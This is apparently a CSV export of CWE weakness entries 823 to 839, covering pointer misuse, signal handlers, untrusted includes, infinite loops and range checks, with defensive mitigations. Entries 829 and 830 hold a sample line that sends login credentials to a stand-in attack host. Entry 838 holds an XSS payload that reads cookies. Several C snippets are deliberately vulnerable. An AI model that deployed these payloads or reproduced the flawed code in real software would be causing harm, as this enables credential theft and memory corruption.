CWE-823: Use of Out-of-range Pointer Offset,"The product performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.","Scope: Confidentiality, Impact: Technical Impact:Read MemoryIf the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf the untrusted pointer references a memory location that is not accessible to the program, or points to a location that is ""malformed"" or larger than expected by a read or write operation, the application may terminate unexpectedly., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify MemoryIf the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible., Likelihood: ",无示范例子,无可能的缓解方案
CWE-824: Access of Uninitialized Pointer,The product accesses or uses a pointer that has not been initialized.,"Scope: Confidentiality, Impact: Technical Impact:Read MemoryIf the uninitialized pointer is used in a read operation, an attacker might be able to read sensitive portions of memory., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf the uninitialized pointer references a memory location that is not accessible to the product, or points to a location that is ""malformed"" (such as NULL) or larger than expected by a read or write operation, then a crash may occur., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf the uninitialized pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible., Likelihood: ",无示范例子,无可能的缓解方案
CWE-825: Expired Pointer Dereference,"The product dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.","Scope: Confidentiality, Impact: Technical Impact:Read MemoryIf the expired pointer is used in a read operation, an attacker might be able to control data read in by the application., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf the expired pointer references a memory location that is not accessible to the product, or points to a location that is ""malformed"" (such as NULL) or larger than expected by a read or write operation, then a crash may occur., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf the expired pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible., Likelihood: ","Example 1The following code shows a simple example of a use after free error:(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);if (err) {abrt = 1;free(ptr);}...if (abrt) {logError(""operation aborted before commit"", ptr);}When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.Example 2The following code shows a simple example of a double free error:(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);...if (abrt) {free(ptr);}...free(ptr);Double free vulnerabilities have two common (and sometimes overlapping) causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for freeing the memoryAlthough some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once.","Phase:  Architecture and DesignChoose a language that provides automatic memory management.Phase:  ImplementationWhen freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy."
CWE-826: Premature Release of Resource During Expected Lifetime,The product releases a resource that is still intended to be used by itself or another actor.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read MemoryIf the released resource is subsequently reused or reallocated, then a read operation on the original resource might access sensitive data that is associated with a different user or entity., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartWhen the resource is released, the software might modify some of its structure, or close associated channels (such as a file descriptor). When the software later accesses the resource as if it is valid, the resource might not be in an expected state, leading to resultant errors that may lead to a crash., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify Application Data; Modify MemoryWhen the resource is released, the software might modify some of its structure. This might affect logic in the sections of code that still assume the resource is active. If the released resource is related to memory and is used in a function call, or points to unexpected data in a write operation, then code execution may be possible upon subsequent accesses., Likelihood: ",无示范例子,无可能的缓解方案
CWE-827: Improper Control of Document Type Definition,"The product does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the product to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.","Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesIf the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776)., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Gain Privileges or Assume IdentityThe DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities., Likelihood:",无示范例子,无可能的缓解方案
CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe,"The product defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Execute Unauthorized Code or CommandsThe most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure., Likelihood: ","Example 1This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits.(bad code)Example Language:Cchar *logMessage;void handler (int sigNum) {syslog(LOG_NOTICE, ""%s\n"", logMessage);free(logMessage);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);exit(0);}int main (int argc, char* argv[]) {logMessage = strdup(argv[1]);/* Register signal handlers. */signal(SIGHUP, handler);signal(SIGTERM, handler);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);}The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.The program begins its ""normal"" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.The attacker sends SIGHUP, which invokes handler (call this ""SIGHUP-handler"").SIGHUP-handler begins to execute, calling syslog().syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.The attacker then sends SIGTERM.SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.The SIGTERM handler is invoked.SIGTERM-handler records the log message using syslog(), then frees the logMessage variable.At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running.Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution.Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array.Example 2The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting.(bad code)Example Language:C#include <signal.h>#include <syslog.h>#include <string.h>#include <stdlib.h>void *global1, *global2;char *what;void sh (int dummy) {syslog(LOG_NOTICE,""%s\n"",what);free(global2);free(global1);/* Sleep statements added to expand timing window for race condition */sleep(10);exit(0);}int main (int argc,char* argv[]) {what=argv[1];global1=strdup(argv[2]);global2=malloc(340);signal(SIGHUP,sh);signal(SIGTERM,sh);/* Sleep statements added to expand timing window for race condition */sleep(10);exit(0);}However, the following sequence of events may result in a double-free (CWE-415):a SIGHUP is delivered to the processsh() is invoked to process the SIGHUPThis first invocation of sh() reaches the point where global1 is freedAt this point, a SIGTERM is sent to the processthe second invocation of sh() might do another free of global1this results in a double-free (CWE-415)This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within ""Delivering Signals for Fun and Profit"" [REF-360].","Phases:  Implementation; Architecture and DesignEliminate the usage of non-reentrant functionality inside of signal handlers. This includes replacing all non-reentrant library calls with reentrant calls.Note: This will not always be possible and may require large portions of the product to be rewritten or even redesigned. Sometimes reentrant-safe library alternatives will not be available. Sometimes non-reentrant interaction between the state of the system and the signal handler will be required by design.Effectiveness: HighPhase:  ImplementationWhere non-reentrant functionality must be leveraged within a signal handler, be sure to block or mask signals appropriately. This includes blocking other signals within the signal handler itself that may also leverage the functionality. It also includes blocking all signals reliant upon the functionality when it is being accessed or modified by the normal behaviors of the product."
CWE-829: Inclusion of Functionality from Untrusted Control Sphere,"The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsAn attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site., Likelihood: ","Example 1This login webpage includes a weather widget from an external website:(bad code)Example Language:HTML<div class=""header""> Welcome!<div id=""loginBox"">Please Login:<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><input type=""submit"" value=""Login"" /></form></div><div id=""WeatherWidget""><script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script></div></div>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).For example, user login information could easily be stolen with a single line added to weatherwidget.js:(attack code)Example Language:JavaScript...Weather widget code....document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.","Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.For example, ID 1 could map to ""inbox.txt"" and ID 2 could map to ""profile.txt"". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhases:  Architecture and Design; OperationStrategy:  Attack Surface ReductionStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."
CWE-830: Inclusion of Web Functionality from an Untrusted Source,"The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1This login webpage includes a weather widget from an external website:(bad code)Example Language:HTML<div class=""header""> Welcome!<div id=""loginBox"">Please Login:<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><input type=""submit"" value=""Login"" /></form></div><div id=""WeatherWidget""><script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script></div></div>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).For example, user login information could easily be stolen with a single line added to weatherwidget.js:(attack code)Example Language:JavaScript...Weather widget code....document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.",无可能的缓解方案
CWE-831: Signal Handler Function Associated with Multiple Signals,The product defines a function that is used as a handler for more than one signal.,"Scope: AvailabilityIntegrityConfidentialityAccess ControlOther, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands; Read Application Data; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Varies by ContextThe most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure., Likelihood: ","Example 1This code registers the same signal handler function with two different signals.(bad code)Example Language:Cvoid handler (int sigNum) {...}int main (int argc, char* argv[]) {signal(SIGUSR1, handler)signal(SIGUSR2, handler)}Example 2This code registers the same signal handler function with two different signals (CWE-831). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits.(bad code)Example Language:Cchar *logMessage;void handler (int sigNum) {syslog(LOG_NOTICE, ""%s\n"", logMessage);free(logMessage);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);exit(0);}int main (int argc, char* argv[]) {logMessage = strdup(argv[1]);/* Register signal handlers. */signal(SIGHUP, handler);signal(SIGTERM, handler);/* artificially increase the size of the timing window to make demonstration of this weakness easier. */sleep(10);}The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines:The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM.The program begins its ""normal"" functionality, which is simplified as sleep(), but could be any functionality that consumes some time.The attacker sends SIGHUP, which invokes handler (call this ""SIGHUP-handler"").SIGHUP-handler begins to execute, calling syslog().syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap.The attacker then sends SIGTERM.SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.The SIGTERM handler is invoked.SIGTERM-handler records the log message using syslog(), then frees the logMessage variable.At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running.Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [REF-360]; the original example was shown to be exploitable for code execution.Also note that the strdup(argv[1]) call contains a potential buffer over-read (CWE-126) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array.",无可能的缓解方案
CWE-832: Unlock of a Resource that is not Locked,The product attempts to unlock a resource that is not locked.,"Scope: IntegrityConfidentialityAvailabilityOther, Impact: Technical Impact:DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands; Modify Memory; OtherDepending on the locking being used, an unlock operation might not have any adverse effects. When effects exist, the most common consequence will be a corruption of the state of the product, possibly leading to a crash or exit; depending on the implementation of the unlocking, memory corruption or code execution could occur., Likelihood: ",无示范例子,无可能的缓解方案
CWE-833: Deadlock,"The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Other); DoS: Crash, Exit, or RestartEach thread of execution will ""hang"" and prevent tasks from completing. In some cases, CPU consumption may occur if a lock check occurs in a tight loop., Likelihood: ",无示范例子,无可能的缓解方案
CWE-834: Excessive Iteration,The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.,"Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Amplification; DoS: Crash, Exit, or RestartExcessive looping will cause unexpected consumption of resources, such as CPU cycles or memory. The product's operation may slow down, or cause a long time to respond. If limited resources such as memory are consumed for each iteration, the loop may eventually cause a crash or program exit due to exhaustion of resources, such as an out-of-memory error., Likelihood: ","Example 1In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted.(bad code)Example Language:Cvoid do_something_recursive (int flg){... // Do some real work here, but the value of flg is unmodifiedif (flg) { do_something_recursive (flg); }    // flg is never modified so it is always TRUE - this call will continue until the stack explodes}int flag = 1; // Set to TRUEdo_something_recursive (flag);Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive call to return.(good code)Example Language:Cvoid do_something_recursive (int flg){... // Do some real work here// Modify value of flg on done conditionif (flg) { do_something_recursive (flg); }    // returns when flg changes to 0}int flag = 1; // Set to TRUEdo_something_recursive (flag);Example 2For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold.(bad code)Example Language:Javapublic boolean isReorderNeeded(String bookISBN, int rateSold) {boolean isReorder = false;int minimumCount = 10;int days = 0;// get inventory count for bookint inventoryCount = inventory.getIventoryCount(bookISBN);// find number of days until inventory count reaches minimumwhile (inventoryCount > minimumCount) {inventoryCount = inventoryCount - rateSold;days++;}// if number of days within reorder timeframe// set reorder return boolean to trueif (days > 0 && days < 5) {isReorder = true;}return isReorder;}However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code.(good code)Example Language:Javapublic boolean isReorderNeeded(String bookISBN, int rateSold) {...// validate rateSold variableif (rateSold < 1) {return isReorder;}...}",无可能的缓解方案
CWE-835: Loop with Unreachable Exit Condition ('Infinite Loop'),"The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: AmplificationAn infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond., Likelihood: ","Example 1In the following code the method processMessagesFromServer attempts to establish a connection to a server and read and process messages from the server. The method uses a do/while loop to continue trying to establish the connection to the server when an attempt fails.(bad code)Example Language:Cint processMessagesFromServer(char *hostaddr, int port) {...int servsock;int connected;struct sockaddr_in servaddr;// create socket to connect to serverservsock = socket( AF_INET, SOCK_STREAM, 0);memset( &servaddr, 0, sizeof(servaddr));servaddr.sin_family = AF_INET;servaddr.sin_port = htons(port);servaddr.sin_addr.s_addr = inet_addr(hostaddr);do {// establish connection to serverconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));// if connected then read and process messages from serverif (connected > -1) {// read and process messages...}// keep trying to establish connection to the server} while (connected < 0);// close socket and return success or failure...}However, this will create an infinite loop if the server does not respond. This infinite loop will consume system resources and can be used to create a denial of service attack. To resolve this a counter should be used to limit the number of attempts to establish a connection to the server, as in the following code.(good code)Example Language:Cint processMessagesFromServer(char *hostaddr, int port) {...// initialize number of attempts counterint count = 0;do {// establish connection to serverconnected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));// increment countercount++;// if connected then read and process messages from serverif (connected > -1) {// read and process messages...}// keep trying to establish connection to the server// up to a maximum number of attempts} while (connected < 0 && count < MAX_ATTEMPTS);// close socket and return success or failure...}Example 2For this example, the method isReorderNeeded is part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold.(bad code)Example Language:Javapublic boolean isReorderNeeded(String bookISBN, int rateSold) {boolean isReorder = false;int minimumCount = 10;int days = 0;// get inventory count for bookint inventoryCount = inventory.getIventoryCount(bookISBN);// find number of days until inventory count reaches minimumwhile (inventoryCount > minimumCount) {inventoryCount = inventoryCount - rateSold;days++;}// if number of days within reorder timeframe// set reorder return boolean to trueif (days > 0 && days < 5) {isReorder = true;}return isReorder;}However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop, as in the following code.(good code)Example Language:Javapublic boolean isReorderNeeded(String bookISBN, int rateSold) {...// validate rateSold variableif (rateSold < 1) {return isReorder;}...}",无可能的缓解方案
CWE-836: Use of Password Hash Instead of Password for Authentication,"The product records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityAn attacker could bypass the authentication routine without knowing the original password., Likelihood: ",无示范例子,无可能的缓解方案
"CWE-837: Improper Enforcement of a Single, Unique Action","The product requires that an actor should only be able to perform an action once, or to have only one unique action, but the product does not enforce or improperly enforces this restriction.","Scope: Other, Impact: Technical Impact:Varies by ContextAn attacker might be able to gain advantage over other users by performing the action multiple times, or affect the correctness of the product., Likelihood: ",无示范例子,无可能的缓解方案
CWE-838: Inappropriate Encoding for Output Context,"The product uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Application Data; Execute Unauthorized Code or CommandsAn attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands., Likelihood: ","Example 1This code dynamically builds an HTML page using POST data:(bad code)Example Language:PHP$username = $_POST['username'];$picSource = $_POST['picsource'];$picAltText = $_POST['picalttext'];...echo ""<title>Welcome, "" . htmlentities($username) .""</title>"";echo ""<img src='"". htmlentities($picSource) ."" ' alt='"". htmlentities($picAltText) . '"" />';...The programmer attempts to avoid XSS exploits (CWE-79) by encoding the POST values so they will not be interpreted as valid HTML. However, the htmlentities() encoding is not appropriate when the data are used as HTML attributes, allowing more attributes to be injected.For example, an attacker can set picAltText to:(attack code)""altTextHere' onload='alert(document.cookie)""This will result in the generated HTML image tag:(result)Example Language:HTML<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />The attacker can inject arbitrary javascript into the tag due to this incorrect encoding.","Phase:  ImplementationStrategy:  Output EncodingUse context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component.Phase:  Architecture and DesignStrategy:  Output EncodingWhere possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.Note that some template mechanisms provide built-in support for the appropriate encoding."
CWE-839: Numeric Range Comparison Without Minimum Check,"The product checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Application Data; Execute Unauthorized Code or CommandsAn attacker could modify the structure of the message or data being sent to the downstream component, possibly injecting commands., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)in some contexts, a negative value could lead to resource consumption., Likelihood: ; Scope: ConfidentialityIntegrity, Impact: Technical Impact:Modify Memory; Read MemoryIf a negative value is used to access memory, buffers, or other indexable structures, it could access memory outside the bounds of the buffer., Likelihood: ","Example 1The following code is intended to read an incoming packet from a socket and extract one or more headers.(bad code)Example Language:CDataPacket *packet;int numHeaders;PacketHeader *headers;sock=AcceptSocketConnection();ReadPacket(packet, sock);numHeaders =packet->headers;if (numHeaders > 100) {ExitError(""too many headers!"");}headers = malloc(numHeaders * sizeof(PacketHeader);ParsePacketHeaders(packet, headers);The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory (CWE-195). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow.Example 2The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of ""short s"" is forced in this particular example, short int's are frequently used within real-world code, such as code that processes structured data.(bad code)Example Language:Cint GetUntrustedInt () {return(0x0000FFFF);}void main (int argc, char **argv) {char path[256];char *input;int i;short s;unsigned int sz;i = GetUntrustedInt();s = i;/* s is -1 so it passes the safety check -CWE-697*/if (s > 256) {DiePainfully(""go away!\n"");}/* s is sign-extended and saved in sz */sz = s;/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);input = GetUserInput(""Enter pathname:"");/* strncpy interprets s as unsigned int, so it's treated as MAX_INT(CWE-195), enabling buffer overflow (CWE-119) */strncpy(path, input, s);path[255] = '\0'; /* don't wantCWE-170*/printf(""Path is: %s\n"", path);}This code first exhibits an example ofCWE-839, allowing ""s"" to be a negative number. When the negative short ""s"" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow (CWE-119).Example 3In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method(bad code)Example Language:Cint getValueFromArray(int *array, int len, int index) {int value;// check that the array index is less than the maximum// length of the arrayif (index < len) {// get the value at the specified index of the arrayvalue = array[index];}// if array index is invalid then output error message// and return value indicating errorelse {printf(""Value is: %d\n"", array[index]);value = -1;}return value;}However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.(good code)Example Language:C...// check that the array index is within the correct// range of values for the arrayif (index >= 0 && index < len) {...Example 4The following code shows a simple BankAccount class with deposit and withdraw methods.(bad code)Example Language:Javapublic class BankAccount {public final int MAXIMUM_WITHDRAWAL_LIMIT = 350;// variable for bank account balanceprivate double accountBalance;// constructor for BankAccountpublic BankAccount() {accountBalance = 0;}// method to deposit amount into BankAccountpublic void deposit(double depositAmount) {...}// method to withdraw amount from BankAccountpublic void withdraw(double withdrawAmount) {if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT) {double newBalance = accountBalance - withdrawAmount;accountBalance = newBalance;}else {System.err.println(""Withdrawal amount exceeds the maximum limit allowed, please try again..."");...}}// other methods for accessing the BankAccount object...}The withdraw method includes a check to ensure that the withdrawal amount does not exceed the maximum limit allowed, however the method does not check to ensure that the withdrawal amount is greater than a minimum value (CWE-129). Performing a range check on a value that does not include a minimum check can have significant security implications, in this case not including a minimum range check can allow a negative value to be used which would cause the financial application using this class to deposit money into the user account rather than withdrawing. In this 